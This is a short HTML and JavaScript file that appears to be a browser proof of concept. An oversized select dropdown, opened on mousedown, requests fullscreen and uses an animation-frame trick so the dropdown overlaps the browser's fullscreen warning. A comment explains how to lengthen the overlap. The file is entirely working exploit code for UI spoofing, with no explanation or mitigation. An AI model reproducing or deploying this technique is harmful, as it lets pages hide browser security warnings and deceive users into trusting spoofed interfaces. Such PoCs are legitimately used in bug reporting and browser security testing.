<style>
    body {
        margin: 0;
        padding: 0;
        overflow-x: hidden;
        overflow-y: hidden;
    }

    select {
        height: 9999px;
        width: 9999px;
        font-size: 9em;
    }
</style>

<script>
    function spoof() {
        window.requestAnimationFrame(fillSelect);
        document.documentElement.requestFullscreen();
    }

    function fillSelect() {
        // increase the array index to extend select dropdown overlap duration
        selectElement[641811] = optionElement;
    }
</script>

<select id="selectElement" onmousedown="spoof()">
    <option id="optionElement">
        Test
    </option>
</select>
